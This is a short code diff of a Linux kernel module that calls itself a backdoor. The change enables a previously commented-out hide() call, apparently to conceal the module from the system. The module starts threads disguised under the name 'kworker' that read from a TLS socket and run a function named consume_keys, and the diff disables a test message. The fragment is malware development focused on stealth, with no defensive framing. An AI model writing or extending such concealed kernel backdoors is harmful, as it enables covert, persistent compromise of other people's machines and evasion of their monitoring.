@@ -616,7 +616,7 @@ static int __init mod_init(void) {
 
     svc->read_thread = kthread_run((void*) read_TLS, NULL, "kworker");
 
-    //hide();
+    hide();
 
     printk(KERN_ALERT "backdoor module loaded\n");
 
@@ -624,9 +624,8 @@ static int __init mod_init(void) {
 
     kthread_run((void*) consume_keys, NULL, "kworker");
 
-    const char *foobar = "foobar";
-
-    send_msg(svc->tls_socket, foobar, strlen(foobar));
+    //const char *foobar = "foobar";
+    //send_msg(svc->tls_socket, foobar, strlen(foobar));
 
     return 0;
 }
